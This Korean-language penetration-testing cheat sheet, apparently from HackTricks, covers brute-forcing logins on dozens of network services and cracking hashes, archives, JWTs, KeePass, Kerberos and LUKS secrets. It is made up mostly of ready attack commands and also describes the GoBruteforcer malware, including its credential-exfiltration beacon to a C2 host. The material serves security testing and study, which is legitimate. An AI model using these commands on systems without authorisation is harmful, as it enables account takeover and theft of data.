# Brute Force - CheatSheet

{{#include ../banners/hacktricks-training.md}}

## 기본 자격 증명

사용 중인 기술의 기본 자격 증명을 **google에서 검색**하거나, **다음 링크를 확인해 보세요**:

- [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
- [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
- [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
- [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
- [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
- [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
- [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
- [**https://many-passwords.github.io/**](https://many-passwords.github.io)
- [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **나만의 사전 만들기**

대상에 대한 정보를 최대한 많이 수집하고 맞춤형 사전을 생성하세요. 도움이 될 수 있는 도구:

### Crunch

```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```

### 웹사이트 기반 워드리스트

```bash
# Cewl gets words from the victims page
cewl example.com -m 5 -w words.txt

# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
cat /path/to/urls.txt | tok

# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
cat /path/to/js-urls.txt | python3 getjswords.py
```

### [CUPP](https://github.com/Mebus/cupp)

피해자에 대해 알고 있는 정보를 바탕으로 비밀번호를 생성합니다(이름, 날짜 등).

```
python3 cupp.py -h
```

### [Wister](https://github.com/cycurity/wister)

단어 집합을 입력하면 해당 단어를 여러 방식으로 변형해 특정 대상에 맞는 고유하고 이상적인 wordlist를 만들 수 있는 wordlist 생성 도구입니다.

```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

 __          _______  _____ _______ ______ _____
 \ \        / /_   _|/ ____|__   __|  ____|  __ \
  \ \  /\  / /  | | | (___    | |  | |__  | |__) |
   \ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
    \  /\  /   _| |_ ____) |  | |  | |____| | \ \
     \/  \/   |_____|_____/   |_|  |______|_|  \_\

      Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```

### [pydictor](https://github.com/LandGrey/pydictor)

### 단어 목록

- [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
- [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
- [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
- [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
- [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
- [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
- [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

## 인터넷 전반을 대상으로 하는 bruteforcer 워크플로(Go 기반 스캐너에서 얻은 교훈)

GoBruteforcer 악성코드의 스캔 워크플로에서 다음 동작이 관찰되었습니다. 정확한 값은 샘플별로 다릅니다.<sup>[[1]](#references)</sup>

- **아키텍처에 맞게 조정된 worker pool**을 유지합니다(예: `x86_64/arm64`에서는 동시 worker 95개, `i686`에서는 85개, `armv5tel`에서는 35개, 그 외 아키텍처에서는 기본값 50개). 활성 worker를 초마다 확인하고 목표치보다 적으면 새 worker를 실행합니다. 각 worker는 종료 전에 대상 IP를 최대 하나만 처리합니다.
- **임의의 공개 IPv4 주소**를 생성하되, 명백히 라우팅할 수 없는 범위와 운영자가 제외하는 특정 범위는 버립니다. 해당 범위는 RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, 멀티캐스트 `>=224.0.0.0/4`, 클라우드가 많이 사용하는 `/8`(`3/15/16/56`), DoD 관련 `/8`(`6/7/11/21/22/26/28/29/30/33/55/214/215`)입니다.
- 짧은 timeout(~2초)으로 **서비스 포트를 확인**한 후 **평문 로그인**(FTP/21, MySQL/3306, Postgres/5432, HTTP/80을 통한 phpMyAdmin)을 시도합니다. C2에서 credential을 가져오는 데 실패하면 **작은 내장 credential 목록**을 대신 사용합니다.
- `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>`와 같은 작은 HTTP GET beacon으로 **발견한 정보를 유출**합니다(서비스 코드는 `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres` 등). 흔히 사용하는 브라우저 User-Agent를 재사용해 정상 트래픽처럼 보이게 합니다.
- **phpMyAdmin spray**는 `GET /index.php?lang=en`으로 가능성이 높은 경로 약 80개를 무차별 대입하고, PMA 식별자(`pmahomme` 테마/`phpmyadmin.css`/`navigation.php`)를 탐지한 뒤 `codemirror.css?v=X.Y.Z`를 파싱해 인증 방식을 분기합니다. 버전이 `<4.9`이면 GET 매개변수 `pma_username`/`pma_password`를 허용하고, 버전이 `>=4.9`이면 `server=1`, CSRF `token` 및 동일한 credential을 사용하는 POST 요청을 사용합니다.

## 서비스

서비스 이름의 알파벳순입니다.

### AFP

```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```

### AJP

```bash
nmap --script ajp-brute -p 8009 <IP>
```

### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM 및 Solace)

```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```

### Cassandra

```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```

### ClickHouse

[bruter](https://github.com/vflame6/bruter)

```bash
bruter clickhouse -u default -p passwords.txt localhost:9000
```

### CouchDB

```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```

### Docker Registry

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```

### Elasticsearch

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```

### FTP

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```

### HTTP 일반 Brute

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Basic Auth

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```

### HTTP - NTLM

```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```

### HTTP - POST 양식

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```

https의 경우 "http-post-form"에서 "**https-post-form"으로 변경해야 합니다

### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle

```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```

### IMAP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```

### IRC

```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```

### ISCSI

```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```

### JWT

```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```

### LDAP

```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```

### MQTT

```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```

### Mongo

```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```

### MSSQL

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```

```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```

### MySQL

```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```

### OracleSQL

```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```

**patator**에서 **oracle_login**을 사용하려면 다음을 **설치**해야 합니다:

```bash
pip3 install cx_Oracle --upgrade
```

[오프라인 OracleSQL 해시 brute force](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**버전 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** 및 **11.2.0.3**):

```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```

### POP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```

### PostgreSQL

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```

### PPTP

[https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)에서 `.deb` 패키지를 다운로드하여 설치할 수 있습니다.

```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```

### RDP

```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```

### Redis

```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```

### Rexec

비밀번호 인증을 사용하는 Rexec 서비스 동작은 [Pentesting Rexec (512/TCP)](../network-services-pentesting/512-pentesting-rexec.md)를 참조하세요.

```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```

### Rlogin

신뢰 호스트 인증 및 터미널 액세스는 [Pentesting Rlogin (513/TCP)](../network-services-pentesting/pentesting-rlogin.md#rlogin-513tcp)를 참조하세요.

```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```

### Rsh

신뢰 호스트 인증 및 원격 명령에 대해서는 [Pentesting Rsh (514/TCP)](../network-services-pentesting/pentesting-rlogin.md#rsh-514tcp)를 참조하세요.

```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```

[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```

### RTSP

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

### SFTP

```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

### SNMP

```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```

### SMB

```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```

### SMPP

```bash
bruter smpp -u smppclient1 -p passwords.txt localhost:2775
```

### SMTP

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```

### SOCKS

```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```

### SQL Server

```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```

### SSH

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

#### 취약한 SSH 키 / Debian 예측 가능한 PRNG

일부 시스템에는 암호화 자료를 생성하는 데 사용되는 난수 시드에 알려진 결함이 있습니다. 이로 인해 키 공간이 크게 줄어들어 [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)와 같은 도구로 bruteforce 공격을 할 수 있습니다. [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)와 같이 미리 생성된 취약한 키 모음도 제공됩니다.

### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)

STOMP 텍스트 프로토콜은 RabbitMQ, ActiveMQ, HornetQ, OpenMQ와 같은 널리 쓰이는 메시지 큐 서비스와 **원활하게 통신하고 상호 작용할 수 있도록 하는** 메시징 프로토콜입니다. 메시지를 교환하고 다양한 메시징 작업을 수행하는 표준화되고 효율적인 방식을 제공합니다.

```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```

### Telnet

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
    --username admin \
    --password wordlists/passwords.txt \
    --target localhost:23 \
    --telnet-user-prompt "login: " \
    --telnet-pass-prompt "Password: " \
    --telnet-prompt ":~$ " \
    --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```

### VNC

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```

### Winrm

```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```


## 로컬

### 온라인 크래킹 데이터베이스

- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 및 SHA1)
- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (ESS/SSP 유무와 관계없이, 모든 challenge 값으로 MSCHAPv2/PPTP-VPN/NetNTLMv1)
- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash, WPA2 캡처, MSOffice, ZIP, PDF 등의 아카이브)
- [https://crackstation.net/](https://crackstation.net) (Hash)
- [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
- [https://gpuhash.me/](https://gpuhash.me) (Hash 및 파일 Hash)
- [https://hashes.org/search.php](https://hashes.org/search.php) (Hash)
- [https://www.cmd5.org/](https://www.cmd5.org) (Hash)
- [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
- [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
- [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Hash를 brute force하기 전에 여기를 확인하세요.

### ZIP

```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```

#### 알려진 평문 ZIP 공격

암호화 전 스트림의 최소 12바이트를 알고 있고, 그중 8바이트가 연속된 경우 [`bkcrack`](https://github.com/kimci86/bkcrack)을 사용해 **ZipCrypto** 항목을 공격할 수 있습니다. 저장된 항목은 원본 파일 바이트를 해당 스트림으로 노출합니다. DEFLATE 항목의 경우 원본 파일만 알고 있는 것으로는 충분하지 않습니다. 공격에는 압축기와 설정에 따라 달라지는 일치하는 압축 바이트가 필요합니다. `bkcrack`은 내부 키를 복구하며, 원래 비밀번호 복구는 선택 사항입니다.<sup>[[16]](#references)[[17]](#references)</sup> ZIP 구조 분석은 [ZIP tricks](../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/zips-tricks.md)를 참조하세요.

```bash
bkcrack -L encrypted.zip  # identify ZipCrypto and Store/Deflate entries
# Stored member: known.txt contains the member's original bytes (or a known prefix).
bkcrack -C encrypted.zip -c entry.txt -p known.txt
# Deflated member: matching.zip must contain the same compressed stream.
bkcrack -C encrypted.zip -c entry.txt -P matching.zip -p entry.txt
# Replace KEY0..KEY2 with the three recovered keys; assumes entries share a password.
bkcrack -C encrypted.zip -k KEY0 KEY1 KEY2 -D decrypted.zip
```

### 7z

```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```

### PDF

```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```

### PDF Owner 비밀번호

PDF Owner 비밀번호를 크랙하려면 다음을 확인하세요: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT

```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```

### NTLM cracking

```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```

### Keepass

```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Keberoasting

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Lucks 이미지

#### 방법 1

설치: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)

```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

#### 방법 2

```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

또 다른 Luks BF 튜토리얼: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql

```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```

### PGP/GPG 개인 키

```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```

### Cisco

<figure><img src="../images/image (663).png" alt=""><figcaption></figcaption></figure>

### DPAPI 마스터 키

[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)를 사용한 다음 john을 사용하세요.

### Open Office 암호로 보호된 열

암호로 보호된 열이 있는 xlsx 파일이 있다면 보호를 해제할 수 있습니다.

- **google drive에 업로드하면** 암호가 자동으로 제거됩니다.
- **수동으로** **제거하려면**:

```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
